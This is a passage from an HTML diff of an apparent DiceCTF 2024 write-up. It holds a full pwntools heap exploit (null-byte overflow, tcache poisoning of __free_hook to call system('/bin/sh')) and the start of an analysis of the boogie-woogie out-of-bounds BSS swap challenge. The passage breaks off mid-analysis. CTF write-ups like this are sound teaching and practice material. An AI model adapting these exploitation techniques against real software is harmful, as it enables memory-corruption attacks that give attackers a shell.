+</span></span><span class="line"><span class="cl"><span class="c1">#Fill tcache</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="n">do_str</span><span class="p">(</span><span class="mh">0xf8</span><span class="p">,</span> <span class="s1">&#39;P&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="n">do_free</span><span class="p">(</span><span class="mi">5</span><span class="o">+</span><span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">do_free</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="c1">#free the chunk after our fake chunk. tcache is full, so will consolidate backwards into a one big unsorted bin</span></span></span></code></pre></div></div>
+<p>We firstly allocate a chunk to trigger the nullbyte overflow.
+Next, we allocate a chunk of size 0x148. This chunk&rsquo;s size field will be overwritten.</p>
+<p>Then, we call <code>strtok</code> with <code>0x51</code>, which is the first byte of the next chunk size field (0x48 will be 0x51). this will change the size field of that chunk from 0x151, to 0x100.</p>
+<p>Then, we fill up the tcache bin. we don&rsquo;t want the corrupted chunk to be inserted into the tcache bin, because it won&rsquo;t consolidate backwards this way.</p>
+<p>Lastly, we free the corrupted chunk, which will consolidate backwards with our fake chunk.</p>
+<p>Here is how the heap looks like after the free:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/dicectf-quals-2024/image-1.png"
+        data-srcset="/posts/dicectf-quals-2024/image-1.png, /posts/dicectf-quals-2024/image-1.png 1.5x, /posts/dicectf-quals-2024/image-1.png 2x"
+        data-sizes="auto"
+        alt="/posts/dicectf-quals-2024/image-1.png"
+        title="Alt text" width="1196" height="432" /></p>
+<p>We can see that there is a chunk of size 0x201 in the unsorted bin, and just below it there is a tcache bin.</p>
+<p>We can know allocate a chunk of size 0x200, and overwrite the tcache meta data, to start our tcache poisening attack:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-py">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">do_str</span><span class="p">(</span><span class="mh">0x1f8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;P&#39;</span> <span class="o">*</span> <span class="mh">0x38</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x71</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">__free_hook</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">do_str</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="c1">#allocate from tcache</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">do_str</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">system</span><span class="p">))</span> <span class="c1">#this will write system to __free_hook</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">do_free</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="c1">#trigger __free_hook</span></span></span></code></pre></div></div>
+<p>This part will change the fd of our tcache chunk to point to <code>__free_hook</code>.</p>
+<p>Later, when allocating from the tcache, it will think there is an available chunk at <code>__free_hook</code>, and return a pointer to it.</p>
+<p>then we can just write whatever we want to there.</p>
+<p>Here is the full exploit:</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-py">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./chall&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./libc.so.6&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">e</span><span class="o">.</span><span class="n">process</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">index</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">do_str</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="n">string</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="k">global</span> <span class="n">index</span>
+</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;exit&#34;</span><span class="p">,</span> <span class="s2">&#34;1&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;size? &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;str? &#34;</span><span class="p">,</span> <span class="n">string</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">index</span> <span class="o">+=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">index</span><span class="o">-</span><span class="mi">1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">do_tok</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">delim</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;exit&#34;</span><span class="p">,</span> <span class="s2">&#34;2&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;idx?&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;delim?&#34;</span><span class="p">,</span> <span class="n">delim</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;1.&#34;</span><span class="p">)[</span><span class="mi">1</span><span class="p">:</span><span class="o">-</span><span class="mi">3</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">do_free</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;exit&#34;</span><span class="p">,</span> <span class="s2">&#34;3&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;idx? &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">do_str</span><span class="p">(</span><span class="mh">0x70</span><span class="p">,</span> <span class="s1">&#39;b&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">do_str</span><span class="p">(</span><span class="mh">0x70</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">do_free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">do_free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">do_str</span><span class="p">(</span><span class="mh">0x70</span><span class="p">,</span> <span class="s1">&#39;P&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">heap_leak</span> <span class="o">=</span> <span class="p">(</span><span class="n">u64</span><span class="p">(</span><span class="n">do_tok</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s2">&#34;a&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)))</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mh">0xfffffffffffff000</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;HEAP LEAK @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap_leak</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">fake_chunk_address</span> <span class="o">=</span> <span class="n">heap_leak</span> <span class="o">+</span> <span class="mh">0x1370</span>
+</span></span><span class="line"><span class="cl"><span class="n">fake_chunk</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_chunk_address</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_chunk_address</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">do_str</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">,</span> <span class="s1">&#39;A&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">do_str</span><span class="p">(</span><span class="mh">0x50</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;G&#39;</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="n">fake_chunk</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">do_free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">do_str</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">,</span> <span class="s1">&#39;A&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">do_str</span><span class="p">(</span><span class="mh">0x60</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;F&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">do_tok</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s2">&#34;a&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x3ebc41</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;LIBC LEAK @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">do_str</span><span class="p">(</span><span class="mh">0x38</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mh">0x38</span><span class="p">)</span> <span class="c1"># idx=4</span>
+</span></span><span class="line"><span class="cl"><span class="n">do_str</span><span class="p">(</span><span class="mh">0x148</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;B&#39;</span> <span class="o">*</span> <span class="mh">0xf8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x28</span> <span class="o">*</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">))</span> <span class="c1">#size field of this chunk is 0x151</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">do_tok</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="nb">chr</span><span class="p">(</span><span class="mh">0x51</span><span class="p">))</span> <span class="c1"># trigger null byte</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">do_free</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">do_str</span><span class="p">(</span><span class="mh">0x38</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;B&#39;</span> <span class="o">*</span> <span class="mh">0x30</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x100</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#Fill tcache</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="n">do_str</span><span class="p">(</span><span class="mh">0xf8</span><span class="p">,</span> <span class="s1">&#39;P&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="n">do_free</span><span class="p">(</span><span class="mi">5</span><span class="o">+</span><span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">do_free</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="c1">#free the chunk after our fake chunk. tcache is full, so will consolidate backwards into a one big unsorted bin</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">do_str</span><span class="p">(</span><span class="mh">0x1f8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;P&#39;</span> <span class="o">*</span> <span class="mh">0x38</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x71</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">__free_hook</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">do_str</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="c1">#allocate from tcache</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">do_str</span><span class="p">(</span><span class="mh">0x68</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">system</span><span class="p">))</span> <span class="c1">#this will write system to __free_hook</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">do_free</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="c1">#trigger __free_hook</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div></div>
+<h2 id="boogie-woogie">boogie-woogie</h2>
+<p>Boogie-woogie was a really simple challenge made by <code>pepsipu</code>.</p>
+<h3 id="code-overview-1">Code Overview</h3>
+<p>Here is the code for the challenge:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-c">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kr">__int64</span> <span class="n">num1</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-18h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">num2</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-10h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">v6</span> <span class="o">=</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="n">_art</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span> <span class="n">data</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">num2</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">...</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n\x1B</span><span class="s">[31;49;1;4m%s</span><span class="se">\x1B</span><span class="s">[0m</span><span class="se">\n\n\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%zu %zu&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">num1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">num2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">clap</span><span class="p">(</span><span class="n">num1</span><span class="p">,</span> <span class="n">num2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="kr">__fastcall</span> <span class="nf">clap</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">num1</span><span class="p">,</span> <span class="kr">__int64</span> <span class="n">num2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">data</span><span class="p">[</span><span class="n">num1</span><span class="p">]</span> <span class="o">^=</span> <span class="n">data</span><span class="p">[</span><span class="n">num2</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="n">data</span><span class="p">[</span><span class="n">num2</span><span class="p">]</span> <span class="o">^=</span> <span class="n">data</span><span class="p">[</span><span class="n">num1</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="n">data</span><span class="p">[</span><span class="n">num1</span><span class="p">]</span> <span class="o">^=</span> <span class="n">data</span><span class="p">[</span><span class="n">num2</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+<p>So the program will take 2 numbers as our input, and will swap two values from the global <code>data</code> string. It will also print this string to us.</p>
+<p>The vulnerability here is really simple, the clap function doesn&rsquo;t check if we exceed the <code>data</code> array, leading to an OOB read/write on the BSS.</p>
+<h3 id="exploitation-1">Exploitation</h3>
+<p>Now, most of the challenge is exploiting this primitive.</p>
+<p>Running checksec on the binary, reveals that it has been compiled with full mitegions:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>pwn/boogie$ checksec --file=boogie-woogie
+[*] &#39;/home/itay/Desktop/dicectf/pwn/boogie/boogie-woogie&#39;
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+    RUNPATH:  b&#39;.&#39;</code></pre></div>
+<p>Please note that since Full RELRO is enabled, we can&rsquo;t simply overwrite GOT entries with our primitive, because they are in a non-writable page.</p>
+<p>We can also put the binary in IDA and look for interesting variables we can write into in the bss, sometimes the compiler puts <code>stdin</code> there, but we can see that its not the case here.</p>
+<p>There is one variable other than our <code>data</code> string, which is <code>__dso_handle</code>.</p>
+<p><code>__dso_handle</code> is a &ldquo;guard&rdquo; that is used to identify dynamic shared objects during global destruction.</p>
+<p>Looking at xrefs for that variable, reveals that the external <code>__cxa_finalize</code> function gets called with it as a parameter.</p>
+<p>Then we can look at <code>__cxa_finalize</code> <a href="https://github.com/lattera/glibc/blob/master/stdlib/cxa_finalize.c" target="_blank" rel="noopener noreffer ">source code</a>, and see that there is not a use to this variable, it does some basics checks on it before proceeding: <code>if ((d == NULL || d == f-&gt;func.cxa.dso_handle) &amp;&amp; f-&gt;flavor == ef_cxa)</code>. Changing it can only interrupt the execution of <code>__cxa_finalize</code>, but it won&rsquo;t really corrupt it and won&rsquo;t even crash.</p>
+<p>One thing to notice though is that it points to itself, a pointer to the bss. we can use it to leak the binary base:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">    <span class="n">slap_length</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">24</span><span class="p">,</span> <span class="mi">8</span><span class="p">)</span> <span class="c1">#offset to __dso_handle</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[</span><span class="mi">12</span><span class="p">:</span><span class="o">-</span><span class="mi">6</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">exe</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>  <span class="o">-</span> <span class="mh">0xf008</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;EXE @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">exe</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span></span></span></code></pre></div></div>
+<p>Now, we are kinda stuck.</p>
+<p>There is nothing we can override in the bss, and we can&rsquo;t do anything.</p>
+<p>But, what if we write to the heap?</p>
+<p>The heap base address is usually pretty close to the binary base address.</p>
+<p>In order to test this, I wrote this simple c script, to show me the offset from the end of the bss, to the start of the heap:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-c">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">char</span><span class="o">*</span> <span class="n">hi</span> <span class="o">=</span> <span class="s">&#34;hello&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl"> 	<span class="kt">void</span> <span class="o">*</span> <span class="n">a</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x2a0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">void</span><span class="o">*</span> <span class="n">b</span> <span class="o">=</span> <span class="n">hi</span> <span class="o">+</span> <span class="mh">0x1ffc</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;diff: %p&#34;</span><span class="p">,</span> <span class="n">a</span> <span class="o">-</span> <span class="n">b</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+<p>Running it multiple times, reveals that usually there is just 12 bits of bruteforce, since the first 12 bits are always 0:</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-">
+        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><pre tabindex="0"><code>$ ./test 
+diff: 0x1add000
+$ ./test 
+diff: 0xfad000
+$ ./test 
+diff: 0x1299000
+$ ./test 
+diff: 0xce5000
+$ ./test</code></pre></div>
